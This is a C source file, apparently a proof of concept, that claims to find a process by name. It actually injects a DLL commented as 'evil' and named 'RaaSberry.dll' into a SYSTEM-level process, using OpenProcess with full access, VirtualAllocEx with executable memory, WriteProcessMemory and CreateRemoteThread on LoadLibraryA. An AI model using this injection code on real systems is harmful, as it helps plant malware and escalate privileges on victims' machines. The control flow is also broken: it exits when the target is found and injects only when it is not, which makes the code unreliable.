/* PoC for finding a process by name */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

char RaaSDLL[] = "C:\\RaaSberry.dll";
unsigned int RaaSLen = sizeof(RaaSDLL) + 1;

// find process SYSTEM level process by process name
int findProcess(const char *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hres;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // initialize size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hres = Process32First(hSnapshot, &pe);
    if (!hres) {
        CloseHandle(hSnapshot);
        return 0;
    }

    // retrieve information about the processes 
    // exit if unsuccessful
    while (hres) {
        // if process is found, return pid
        if (strcmp(pe.szExeFile, procname) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hres = Process32Next(hSnapshot, &pe);
    }
    // cleanup the open handle CreateToolhelp32Snapshot
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0; // process ID
    HANDLE hProcess; // process handle
    HANDLE hThread; // thread handle
    LPVOID pRemoteBuf; // remote buffer

    //handle to kernel32.dll and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lpLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

    // find process by name
    pid = findProcess(argv[1]);
    if (pid) {
        printf("Process %s is running with PID %d\n", argv[1], pid); // print process name and PID
        return -1;
    } else {
        printf("Process %s is not running\n", argv[1]);
    }

    // open process with all access
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    // allocate memory buffer for remote process
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, RaaSLen, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    // "copy" evil DLL between processes
    WriteProcessMemory(hProcess, pRemoteBuf, RaaSDLL, RaaSLen, NULL);
    // process will start a new thread to load our DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibraryA, pRemoteBuf, 0, NULL);
    // close handles
    CloseHandle(hProcess);
    return 0;

    // compile w/ x86_64-w64-mingw32-gcc -O2 <name>.cpp -o <name>.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1

}